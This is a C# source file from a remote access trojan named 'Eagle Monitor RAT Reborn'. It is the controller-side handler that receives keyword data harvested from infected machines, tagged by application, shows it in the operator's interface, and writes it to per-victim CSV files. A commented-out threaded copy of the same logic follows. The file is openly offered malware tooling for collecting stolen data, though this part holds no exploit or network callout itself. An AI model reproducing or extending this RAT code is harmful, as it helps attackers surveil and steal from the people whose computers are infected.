using Eagle_Monitor_RAT_Reborn.Network;
using Eagle_Monitor_RAT_Reborn.Misc;
using PacketLib.Packet;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class KeywordsPacketHandler
    {
        public KeywordsPacketHandler(KeywordsPacket keywordsPacket) : base()//, ClientHandler clientHandler) 
        {
            if (keywordsPacket.keywordsList != null)
            {
                try
                {
                    if (ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientForm.keywordsDataGridView != null)
                    {
                        ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientForm.keywordsDataGridView.BeginInvoke((MethodInvoker)(() =>
                        {
                            ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientForm.keywordsDataGridView.Rows.Clear();
                            foreach (object[] str in keywordsPacket.keywordsList)
                            {
                                int rowId = ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientForm.keywordsDataGridView.Rows.Add();
                                DataGridViewRow row = ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientForm.keywordsDataGridView.Rows[rowId];
                                row.Cells["Column26"].Value = str[0].ToString();
                                row.Cells["Column27"].Value = str[1].ToString();
                            }
                            if (Program.settings.autoSaveRecovery)
                                Utils.ToCSV(ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientForm.keywordsDataGridView, ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientPath + "\\Keywords\\" + Utils.DateFormater() + ".csv");
                            return;
                        }));
                    }
                    else
                    { Utils.ToCSV(keywordsPacket.keywordsList, ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientPath + "\\Keywords\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Keyword" }); }
                }
                catch { Utils.ToCSV(keywordsPacket.keywordsList, ClientHandler.ClientHandlersList[keywordsPacket.baseIp].clientPath + "\\Keywords\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Keyword" }); }
            }
            else
                return;
            /*new Thread(() =>
            {
                if (keywordsPacket.keywordsList != null)
                {
                    try
                    {
                        if (clientHandler.clientForm.keywordsDataGridView != null)
                        {
                            clientHandler.clientForm.keywordsDataGridView.BeginInvoke((MethodInvoker)(() =>
                            {
                                clientHandler.clientForm.keywordsDataGridView.Rows.Clear();
                                foreach (object[] str in keywordsPacket.keywordsList)
                                {
                                    int rowId = clientHandler.clientForm.keywordsDataGridView.Rows.Add();
                                    DataGridViewRow row = clientHandler.clientForm.keywordsDataGridView.Rows[rowId];
                                    row.Cells["Column26"].Value = str[0].ToString();
                                    row.Cells["Column27"].Value = str[1].ToString();
                                }
                                if (Program.settings.autoSaveRecovery)
                                    Utils.ToCSV(clientHandler.clientForm.keywordsDataGridView, clientHandler.clientPath + "\\Keywords\\" + Utils.DateFormater() + ".csv");
                                return;
                            }));
                        }
                        else
                        { Utils.ToCSV(keywordsPacket.keywordsList, clientHandler.clientPath + "\\Keywords\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Keyword" }); }
                    }
                    catch { Utils.ToCSV(keywordsPacket.keywordsList, clientHandler.clientPath + "\\Keywords\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Keyword" }); }
                }
                else
                    return;
            }).Start();*/
        }
    }
}
